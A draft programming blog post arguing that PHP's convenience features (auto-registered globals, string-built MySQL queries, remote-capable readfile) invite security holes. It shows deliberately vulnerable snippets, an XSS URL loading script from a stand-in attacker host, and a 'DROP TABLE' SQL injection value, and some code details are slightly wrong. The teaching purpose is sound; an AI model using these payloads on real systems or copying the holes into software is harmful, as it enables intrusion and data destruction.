@title More is Worse
@draft

Countless stories and folk tales relate the story of a man who sought or otherwise found boundless power, which proved too much to handle and ultimately destroyed him. Yet, what brought most of us to programming is the unmistakable feeling of omnipotence, the ability to make the machine do anything one desires provided that one can explain how to do it.

And, inevitably, the bitter taste of experience teaches us that omnipotence is the greatest curse that has ever befallen the computer programmer or the system administrator, leaving us to face the new generation of programmers who delight in the latest programming language version of the swiss army knife, favoring expressiveness over safety and security.

Much to my delight, PHP has been a historical breeding ground for such low-safety, low-security, low-verbosity solutions.
<h2>Automatic global variables</h2>
Perhaps the oldest and most delicate security issue in PHP was the automatic registration of request arguments as global variables. Consider the simple PHP script that displays a countdown in bold and italics:
<blockquote>
<pre style="background: #ffffff none repeat scroll 0% 50%; color: #000000;"><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">assert</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">is_int</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$count</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 

<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">while</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$count</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">0</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$result</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">string</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$count</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">", "</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 

<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$result</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"Fire!"</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 

<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">echo</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'&lt;p&gt;In bold: &lt;b&gt;'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$result</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'&lt;/b&gt;.&lt;/p&gt;'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">echo</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'&lt;p&gt;In italics: &lt;i&gt;'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$result</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'&lt;/i&gt;.&lt;/p&gt;'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span></pre>
</blockquote>
This snippet uses two common productivity-enhancing features of the earlier PHP incarnations: the fact that variables could be used without being initialized (so <span style="font-family: courier new,courier; color: #999999;">$result</span> is initially null, implicitly converted to the empty string, and then used) and the automatic registration of variables, allowing $count to equal what is now known as <span style="font-family: courier new,courier; color: #999999;">$_REQUEST['count']</span> (which could be provided, for instance, by accessing <span style="font-family: courier new,courier; color: #999999;">http://example.com/script.php?count=3</span>).

Obviously, this creates huge vulnerabilities. For instance, a short piece of code such as the one above could very well contain an <a href="http://en.wikipedia.org/wiki/Cross-site_scripting">XSS</a> (cross-site scripting) vulnerability! It's enough for an attacker to find out that the script uses a variable named $result (fairly easy with open source software) and provide an initial value for it, for instance injecting some javascript on another page. The victim would be vulnerable when following an URL such as:
<blockquote>
<pre><span style="font-family: courier new,courier; color: #999999;">http://example.com/script.php?count=0&amp;result=&lt;script src=http://haxor.com/hax.js&gt;&lt;/script&gt;</span></pre>
</blockquote>
Now that the attacker has injected arbitrary JS in thevictim's browser on the page that is being attacked, he can do anything as if he were the victim, using the victim's session on the target site.

Needless to say, PHP has already restricted the use of automatic global registration to contain this evil.
<h2>SQL Queries</h2>
Yet another high-productivity improvement in PHP is its tight connection with the MySQL database management system. In the good old days when "real programmers" had to update an account balance in a database, they would write a stored SQL procedure which received the account balance as an argument and performed the correct manipulation, then they would write some web server code that connected to the database and called that stored procedure.

PHP allows its users to brutally shorten the amount of work necessary for that:
<blockquote>
<pre style="background: #ffffff none repeat scroll 0% 50%; color: #000000;"><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">function</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> update_balance</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$id</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$amount</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">{</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">mysql_connect</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">mysql_query</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">    </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"UPDATE accounts "</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">    </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"SET balance = balance + </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">$amount</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;"> "</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">    </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"WHERE id = </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">$id</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">}</span></pre>
</blockquote>
This code works by generating an SQL query as a string, then sending that query over the connection to the MySQL database manager, which runs it as-is. This code contains a classic <a href="http://en.wikipedia.org/wiki/Sql_injection">SQL injection</a> vulnerability, where the attacker provides values of the $id or $amount variables that generate malicious SQL code. For instance, providing <span style="font-family: courier new,courier; color: #999999;">$amount = "0; DROP TABLE accounts; --"</span> and <span style="font-family: courier new,courier; color: #999999;">$id = 0</span> results in the generated (and executed) SQL statements:
<blockquote>
<pre style="background: #ffffff none repeat scroll 0% 50%; color: #000000;"><span style="color: #000084; font-weight: bold;">UPDATE</span> accounts <span style="color: #000084; font-weight: bold;">SET</span> balance = balance + 0; 
<span style="color: #000084; font-weight: bold;">DROP</span> <span style="color: #000084; font-weight: bold;">TABLE</span> accounts;  
<span style="color: #808080;">-- WHERE id = 0</span></pre>
</blockquote>
Of course, this assumes that there are no other safety rules that filter out invalid values for <span style="font-family: courier new,courier; color: #999999;">$amount</span> or <span style="font-family: courier new,courier; color: #999999;">$id</span> (which must be integers). But when the data being stored is a bit of text, which should be stored as-is regardless of what it contains, the safety checks disappear and the vulnerability becomes apparent (and often exploited, sometimes in the <a href="http://xkcd.com/327/">least expected</a> ways).

There are certainly workaround for this, the first of them being the existence of <span style="font-family: courier new,courier; color: #999999;">mysql_real_escape_query</span>, which eliminates any risk of injection, <em>provided that it is used</em>, and it's easy to forget using it (not to mention the overhead of using it). Many frameworks provide their own version of a query generator that automatically escapes query arguments. My own mini-framework involves:
<blockquote>
<pre style="background: #ffffff none repeat scroll 0% 50%; color: #000000;"><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$link</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">mysql_connect</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">qprintf</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$link</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"UPDATE accounts "</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"SET balance = balance + {0} "</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">.</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">"WHERE id = {1}"</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$amount</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$id</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span></pre>
</blockquote>
And the Zend Framework involves:
<blockquote>
<pre style="background: #ffffff none repeat scroll 0% 50%; color: #000000;"><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$select</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">this</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> select</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> where</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'id = ?'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$id</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 

<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$row</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">this</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> fetchRow</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$select</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$data</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">array</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'balance'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$row</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> balance</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">+</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$amount</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 

<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$where</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">=</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">this</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> getAdapter</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> quoteInto</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'id = ?'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$id</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 

<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">this</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">-</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">&gt;</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> update</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$array</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">,</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$where</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span></pre>
</blockquote>
To account for the unsafety of the short version, more code has to be added.
<h2>Remote file access</h2>
In the beginning, accessing a remove file (for instance, at the other end of an <span style="font-family: courier new,courier; color: #999999;">http://</span> address) in PHP was a difficult task that involved manually connecting to the server to fetch the file (using cURL, for instance).

Then, the elementary file-opening function <span style="font-family: courier new,courier; color: #999999;">fopen </span>gained the ability to open remote files with several protocols (and the possibility to add more).  Suddently, the old fifteen-line routine for reading the contents of an RSS feed became as simple as <span style="font-family: courier new,courier; color: #999999;">readfile("http://example.com/rss.php")</span>, <a href="http://www.urbandictionary.com/define.php?term=And+There+was+Much+Rejoicing">and there was much rejoicing</a>.

One thing led to another, and code using that feature began to multiply using patterns such as these:
<blockquote>
<pre style="background: #ffffff none repeat scroll 0% 50%; color: #000000;"><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">function</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> display_quoted</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$url</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">{</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">print</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'&lt;blockquote&gt;'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">@</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">readfile</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">(</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">$url</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">)</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">  </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000084; font-weight: bold;">print</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;"> </span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #0000ff;">'&lt;/blockquote&gt;'</span><span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">;</span> 
<span style="background: #ffffe8 none repeat scroll 0% 50%; color: #000000;">}</span></pre>
</blockquote>
Except that, while <span style="font-family: courier new,courier; color: #999999;">readfile </span>documented that it could open both local and remote files, <span style="font-family: courier new,courier; color: #999999;">display_quoted</span> only documents that it can open remote files. And when a local path is passed to <span style="font-family: courier new,courier; color: #999999;">display_quoted</span>, well, you've just output <span style="font-family: courier new,courier; color: #999999;">config.inc.php</span> and the database passwords that were hidden in there.

The solution, of course, is to distinctly separate functions which operate on local files from functions which operate on remote files. It's certainly possible to keep on using readfile to perform remote access, but additional checks should be made to guarantee that it's performing remote access and note local access.